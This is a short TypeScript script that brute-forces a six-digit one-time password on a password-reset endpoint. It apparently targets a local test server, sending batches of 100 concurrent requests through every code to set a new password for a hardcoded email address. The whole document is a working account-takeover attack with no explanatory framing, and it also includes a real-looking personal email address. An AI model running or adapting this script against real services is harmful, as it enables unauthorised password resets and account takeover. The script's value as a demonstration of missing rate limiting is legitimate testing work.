import axios from 'axios';

async function sendRequest(otp: string) {
    let data = JSON.stringify({
    "email": "rick01.lm10@gmail.com",
    "otp": otp,
    "newPassword": "hello"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: { 
            'Content-Type': 'application/json'
        },
        data : data
    };

    try {
        await axios.request(config)
    } catch (e) {
        
    }
}

async function main() {
    for (let i = 0; i <= 999999; i = i + 100) {
        const p = [];
        console.log(`Trying OTP: ${i}`);
        for (let j = 0; j < 100; j++) {
            p.push(sendRequest((i + j).toString()));
        }
        await Promise.all(p);
    }
}

main();